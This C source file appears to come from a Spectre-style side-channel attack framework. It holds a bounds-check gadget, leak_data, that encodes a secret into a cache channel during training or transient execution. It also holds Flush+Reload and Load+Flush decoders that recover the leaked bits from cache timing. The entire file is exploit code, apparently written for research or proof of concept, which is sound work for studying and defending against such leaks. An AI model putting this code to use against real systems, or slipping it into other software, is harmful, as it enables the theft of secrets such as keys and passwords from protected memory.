#include "../include/spectre.h"

// returns true during the training phase, false if encoding can only happen transiently
bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                  uint8_t bits_count, uint64_t stride),
               uint32_t iteration, uint32_t *train_data,
               uint32_t train_data_len, uint64_t secret, uint8_t channel[],
               uint8_t bits_count, uint64_t stride)
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode(secret, channel, bits_count, stride);
        return true;
    }
    return false;
}

uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (is_cached_load((side_channel) + (i * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (i - 1) % 8);
        }
    }
    return out;
}

uint64_t decode_load_flush_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (!is_cached_load((side_channel) + (i * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (i - 1) % 8);
        }
    }
    return out;
}

uint64_t decode_flush_reload_array_index(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    // running backwards, because 0 is somehow always cached :|
    // But thats fine ;)
    for (uint32_t i = (size_t)powl(2, bits_count); 0 < i; i--)
    {
        if (is_cached_load((side_channel) + ((i-1) * stride), threshold))
        {
            out = i-1;
            break;
        }
    }
    return out;
}
